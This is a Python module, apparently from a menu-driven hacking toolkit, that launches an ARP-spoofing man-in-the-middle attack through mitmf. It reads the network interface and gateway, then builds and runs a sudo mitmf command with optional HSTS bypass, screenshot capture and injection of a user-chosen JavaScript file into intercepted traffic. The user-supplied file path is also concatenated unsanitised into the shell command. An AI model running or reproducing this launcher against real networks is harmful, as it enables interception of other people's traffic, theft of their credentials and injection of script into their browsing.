import os
import sys
from .util import help, clear, bcolors, RepresentsInt


userInterface = ''

def start():
    out = os.popen('ship -g').read().split(' ')
    interface = out[0].replace('\n', '')
    gateway = out[1].replace('\n', '')

    if (userInterface):
        interface = userInterface

    # Array of interfaces
    interArr = os.popen('ship -A').read().split(' ')

    runnerMITM(interface, gateway, interArr)

def runnerMITM(interface, gateway, interArr):

    printModule(interface, gateway)

    # Take user input as int
    choice = input("\n" + bcolors.BOLD +
                   "Please choose an option\n> " + bcolors.ENDC)

    if (RepresentsInt(choice)):
        # Convert in int
        choice = int(choice)

        # Run list
        if choice == 1:
            clear()

            print(bcolors.HEADER + "MITMF Options: " + bcolors.ENDC)

            # Start attack
            command = "sudo mitmf --spoof --arp -i " + interface + " --gateway " + gateway


            hsts = input("\n" + bcolors.BOLD + "Use hsts?\ny/n " + bcolors.ENDC)
            screen = input("\n" + bcolors.BOLD + "Use screenshotter?\ny/n " + bcolors.ENDC)
            inject = input("\n" + bcolors.BOLD + "Inject js file?\ny/n " + bcolors.ENDC)
            if (inject == 'y' or inject == 'yes'):
                file = input("\n" + bcolors.BOLD + "Path to file.\n> " + bcolors.ENDC)
                command += " --inject --js-file " + file

            if (hsts == 'yes' or hsts == 'y'):
                command += " --hsts"

            if (screen == 'yes' or screen == 'y'):
                command += " --screen"

            print(bcolors.OKGREEN + "Launching MITMF" + bcolors.ENDC)
            print(bcolors.OKBLUE + "(C-c) to stop" + bcolors.ENDC)

            os.system(command)
            sys.stdout.write('\b\b\r')  # Current solution
            sys.stdout.flush()
            clear()
            # END Attack


            runnerMITM(interface, gateway, interArr)
        elif choice == 2:

            clear()

            interface = input("\n" + bcolors.BOLD + "Please enter a new interface\n> " + bcolors.ENDC)

            # Recursion
            runnerMITM(interface, gateway, interArr)
        elif choice == 3:
            print(bcolors.HEADER + "Interfaces: " + bcolors.ENDC)
            for interface in interArr:
                print(interface)

            runnerMITM(interface, gateway, interArr)

        elif choice == 4:
            clear()
        else:
            clear()
            print(bcolors.FAIL + "Please input a valid option." + bcolors.ENDC)
            runnerMITM(interface, gateway, interArr)

    else:
        clear()
        print(bcolors.FAIL + "Please input a valid option." + bcolors.ENDC)

        # Recusive loop
        runnerMITM(interface, gateway, interArr)


def printModule(interface, gateway):
    print(str(bcolors.HEADER + "MITM Options: " + bcolors.ENDC))
    print(str(bcolors.BOLD + "Interface: " + interface + bcolors.ENDC))
    print(str(bcolors.BOLD + "Gateway: " + gateway + bcolors.ENDC))
    print("1) Start attack")
    print("2) Change interface")
    print("3) List interfaces")
    print("4) Go back")
